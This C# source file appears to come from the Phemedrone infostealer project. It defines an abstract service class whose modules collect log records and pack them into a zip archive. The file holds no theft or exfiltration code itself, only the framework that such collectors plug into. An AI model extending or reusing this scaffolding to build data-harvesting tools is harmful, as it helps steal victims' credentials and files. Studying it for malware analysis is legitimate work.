using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using Phemedrone.Classes;
using Phemedrone.Extensions;

namespace Phemedrone
{
    public abstract class IService : IDisposable
    {
        public LogRecord[] Entries;
        public abstract PriorityLevel Priority { get; }
        protected abstract LogRecord[] Collect();
        protected virtual string GetServiceName() => string.Empty;

        public void Run()
        {
#if DEBUG
            var sw = new Stopwatch();
            sw.Start();
            
            Entries = Collect();
            
            sw.Stop();
            Console.WriteLine("{0:00} min {1:00} sec {2:00} msec | {3}", sw.Elapsed.Minutes, sw.Elapsed.Seconds, sw.Elapsed.Milliseconds, GetServiceName());
#else
            Entries = Collect();
#endif
        }

        public static void AddRecords(IEnumerable<LogRecord> records, ZipStorage storage)
        {
            foreach (var record in records)
            {
                storage.AddStream(ZipStorage.Compression.Store,
                    record.Path,
                    new MemoryStream(record.Content),
                    DateTime.Now);
            }
        }
        
        // idk if it's gonna work but whatever
        // garbage collector should optimize application memory
        public void Dispose()
        {
            GC.Collect();
            GC.WaitForPendingFinalizers();
        }
    }
}